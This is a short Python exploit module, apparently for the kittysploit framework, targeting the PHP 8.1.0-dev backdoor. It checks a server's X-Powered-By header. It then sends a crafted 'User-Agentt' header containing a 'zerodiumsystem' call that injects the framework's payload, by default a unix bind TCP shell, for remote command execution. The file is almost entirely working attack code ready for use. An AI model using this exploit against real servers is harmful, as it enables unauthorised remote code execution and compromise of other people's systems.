from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Exploit, Http_client):


	__info__ = {
			'name': 'PHP 8.1.0-dev (backdoor)',
			'description': 'PHP 8.1.0-dev (backdoor)',
			'cve': '',
			'platform': Platform.ALL,
			'arch': [Arch.X64, Arch.X86],
			'payload': {
				'default':'payloads/single/cmd/unix/bind_tcp',
				'arch':Arch.PHP,
				},			
		}

	def check(self):
		r = self.http_request(
						method = 'GET',
						path = '/')
		if r:
			if r.headers['X-Powered-By'] == "PHP/8.1.0-dev" :
				return True
		return False	

	def run(self):

		if self.check():
			print_success("PHP 8.1.0-dev found")

			r = self.http_request(
							method = 'GET',
							path = '/',
							headers = {"User-Agentt": f"zerodiumsystem('{self.payload}');"},
							allow_redirects = False)
			return
		self.not_vulnerable()
